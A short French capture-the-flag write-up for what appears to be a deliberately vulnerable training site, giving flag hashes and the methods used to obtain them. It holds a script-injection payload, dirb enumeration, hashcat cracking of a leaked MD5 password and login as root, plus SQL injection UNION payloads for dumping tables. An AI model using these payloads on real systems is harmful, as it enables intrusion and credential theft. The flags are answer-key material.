

FLAG : #0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e

METHOD : faire un `<script>alert(1)</script>` dans la zone de texte 'Message'


FLAG : #d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff


METHOD : Faire un dirb pour voir les pages du site disponible : 

Aller sur la page `http://IP/whatever/` et télécharger le fichier présent : 


Le fichier correspond à des credentials et le mot de passe est un hash MD5 


On stocke `437394baff5aa33daa618be47b75cb49` dans un fichier hash.txt et on le déchiffre avec la commande `hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt` 



Le hash devient `qwerty123@` 

Avec le dirb on constate un chemin vers une page de login d'adminstateur


On teste les credentials `root:qwerty123@` et on récupère le flag. 


FLAG : #10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

- Dans la page "Members" faire 1 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- - pour trouver le nom de la table 

* Utiliser `sqlmap` pour trouver le nom des tables 

- Utiliser injection `1 UNION SELECT commentaire,countersign FROM users`
- Faire l'étape demandée : 
    - Decrypt MD5 : 
    - Encrypt en SHA256 : 


